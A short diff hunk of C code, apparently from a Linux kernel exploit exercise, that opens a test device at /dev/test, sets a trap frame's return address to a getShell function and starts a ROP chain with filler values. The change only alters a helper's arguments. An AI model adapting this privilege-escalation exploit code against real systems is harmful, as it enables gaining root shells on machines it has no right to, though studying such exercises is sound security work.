@@ -19,7 +19,7 @@ int main(){
     long long rop[20] = { 0, };
 
     fd = openModule("/dev/test", 1);
-    prepTF64(1);
+    prepTF64(&tf.user_rip, 1);
     tf.user_rip = getShell; 
 
     rop[0] = 0x4141414141414141;
